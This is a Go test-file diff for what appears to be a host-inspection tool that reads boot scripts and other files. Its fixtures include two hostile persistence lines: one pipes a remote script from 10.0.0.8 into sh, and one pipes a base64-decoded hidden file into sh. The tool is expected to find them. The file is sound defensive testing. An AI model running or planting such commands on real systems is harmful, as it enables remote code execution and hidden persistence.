@@ -47,33 +47,34 @@ func TestReadFilesTierReadsEveryPath(t *testing.T) {
 	if len(steps) != 2 || len(steps[0]) != 1 || len(steps[1]) != 1 {
 		t.Fatalf("the read-files tier is two steps of one probe: %v", steps)
 	}
-	native, ok := steps[0][0].Inv.(model.Native)
-	if !ok {
-		t.Fatalf("the first step should carry an in-process body: %+v", steps[0][0].Inv)
-	}
-	sh, ok := steps[1][0].Inv.(model.Script)
-	if !ok {
-		t.Fatalf("the second step should carry the sh source's loop: %+v", steps[1][0].Inv)
-	}
+	inProcess := filesProbe(t, steps[0][0])
+	shell := filesProbe(t, steps[1][0])
 	for _, path := range paths {
-		if !strings.Contains(sh.Run, path) {
-			t.Fatalf("the loop does not read %s: %q", path, sh.Run)
+		if !strings.Contains(listScript(t, shell.List), path) {
+			t.Fatalf("the list does not name %s: %v", path, shell.List)
 		}
 	}
-	body, err := native.Body(context.Background())
-	if err != nil {
-		t.Fatalf("the tier failed: %v", err)
-	}
-	for _, want := range []string{
-		"== " + paths[1], "== " + paths[2],
-		"curl http://10.0.0.8/i.sh | sh", "base64 -d /etc/.x | sh",
-	} {
-		if !strings.Contains(body, want) {
-			t.Fatalf("%q is missing from the tier's output: %q", want, body)
+	// The in-process list names the existing files alone, and every named path
+	// reads as a section of its own.
+	list := bodyText(t, inProcess.List)
+	for _, want := range []string{paths[1], paths[2]} {
+		if !strings.Contains(list, want) {
+			t.Fatalf("%q is missing from the tier's list: %q", want, list)
 		}
 	}
-	if strings.Contains(body, paths[0]) {
-		t.Fatalf("a path that does not exist should not appear in the report: %q", body)
+	if strings.Contains(list, paths[0]) {
+		t.Fatalf("a path that does not exist should not appear in the report: %q", list)
+	}
+	for _, want := range []string{"curl http://10.0.0.8/i.sh | sh", "base64 -d /etc/.x | sh"} {
+		found := false
+		for _, path := range []string{paths[1], paths[2]} {
+			if strings.Contains(bodyText(t, inProcess.Read(path)), want) {
+				found = true
+			}
+		}
+		if !found {
+			t.Fatalf("%q is missing from the tier's reads", want)
+		}
 	}
 }
 
@@ -85,20 +86,49 @@ func TestBootScriptCheckCoversEveryBootScript(t *testing.T) {
 	if len(check.Steps) != 2 || len(check.Steps[0]) != 1 || len(check.Steps[1]) != 1 {
 		t.Fatalf("the boot-script check is two steps of one probe: %v", check.Steps)
 	}
-	if _, ok := check.Steps[0][0].Inv.(model.Native); !ok {
-		t.Fatalf("the boot-script tier should carry an in-process body: %+v", check.Steps[0][0].Inv)
-	}
-	sh, ok := check.Steps[1][0].Inv.(model.Script)
-	if !ok {
-		t.Fatalf("the boot-script check should carry the sh source's loop: %+v", check.Steps[1][0].Inv)
-	}
+	inProcess := filesProbe(t, check.Steps[0][0])
+	shell := filesProbe(t, check.Steps[1][0])
+	_ = inProcess
 	want := []string{"/etc/rc.local", "/etc/rc.d/rc.local", "/etc/init.sh"}
 	if !slices.Equal(bootScriptPaths, want) {
 		t.Errorf("boot-script paths = %v, want %v", bootScriptPaths, want)
 	}
 	for _, path := range want {
-		if !strings.Contains(sh.Run, path) {
-			t.Errorf("the sh loop does not read %s: %q", path, sh.Run)
+		if !strings.Contains(listScript(t, shell.List), path) {
+			t.Errorf("the sh list does not name %s: %v", path, shell.List)
 		}
 	}
+}
+
+// filesProbe is one probe's file list; the test fails when the probe is not one.
+func filesProbe(t *testing.T, probe model.Probe) *model.Files {
+	t.Helper()
+	if probe.Files == nil {
+		t.Fatalf("probe %s is not a file list: %+v", probe.Label, probe)
+	}
+	return probe.Files
+}
+
+// listScript is a shell list's script text.
+func listScript(t *testing.T, inv model.Invocation) string {
+	t.Helper()
+	shell, ok := inv.(model.Script)
+	if !ok {
+		t.Fatalf("the list is not a shell script: %#v", inv)
+	}
+	return shell.Run
+}
+
+// bodyText runs one in-process body.
+func bodyText(t *testing.T, inv model.Invocation) string {
+	t.Helper()
+	body, ok := inv.(model.Native)
+	if !ok {
+		t.Fatalf("the read is not an in-process body: %#v", inv)
+	}
+	text, err := body.Body(context.Background())
+	if err != nil {
+		t.Fatalf("the body failed: %v", err)
+	}
+	return text
 }
